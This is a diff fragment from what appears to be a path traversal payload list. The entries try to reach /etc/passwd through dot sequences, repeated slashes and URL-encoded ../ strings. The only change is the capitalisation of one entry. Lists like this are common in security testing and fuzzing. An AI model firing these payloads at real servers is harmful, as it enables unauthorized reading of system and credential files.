@@ -27,7 +27,7 @@ _ /ETC/PASSWD
 …./…./…./…./etc/passwd
 …./…./…./…./ETC/PASSWD
 ////etc/passwd
-////etc/PASSWD
+////ETC/PASSWD
 %2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd  (../../../etc/passwd)
 %2e%2e%2f%2e%2e%2f%2e%2e%2f/ETC/PASSWD  (../../../ETC/PASSWD)
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  (../../../../etc/passwd)
